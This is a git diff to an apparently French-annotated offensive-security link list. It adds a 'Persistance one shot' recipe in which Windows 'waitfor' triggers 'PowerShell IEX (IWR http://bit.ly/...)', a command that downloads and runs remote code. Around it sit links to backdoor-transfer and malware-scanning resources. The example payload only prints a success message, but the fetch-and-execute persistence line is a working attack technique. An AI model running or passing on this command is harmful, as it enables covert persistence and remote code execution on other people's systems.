@@ -47,7 +47,17 @@
 * How to Create Linux Self Extracting Archive https://n0where.net/how-to-create-self-extracting-archive/ https://gist.github.com/coh7eiqu8thaBu/f2cafb13c1961b6a73853060c987c8af or http://megastep.org/makeself/makeself-2.1.5.run
 * VirusTotal Wanna Be - Now with 100% more Hipster https://malice.io - https://github.com/maliceio/malice
 * Command line tool for scanning streams within office documents plus xor db attack https://github.com/tylabs/quicksand_lite
+* Persistance one shot
+```
+# Dans une première invite de command :
+waitfor persist && PowerShell IEX (IWR http://bit.ly/L3g1t).Content
 
+# Dans une autre cela déclence la commande précédente et télécharge la charge
+waitfor /s 127.0.0.1 /si persist
+
+# example de charge (http://bit.ly/L3g1t)
+Write-Host SUCCESSFULLY EXECUTED POWERSHELL CODE FROM REMOTE LOCATION -ForegroundColor Green
+```
 
 ## Backdoor download
 * https://www.peerlyst.com/posts/transferring-backdoor-payloads-by-dns-aaaa-records-and-ipv6-address-damon-mohammadbagher
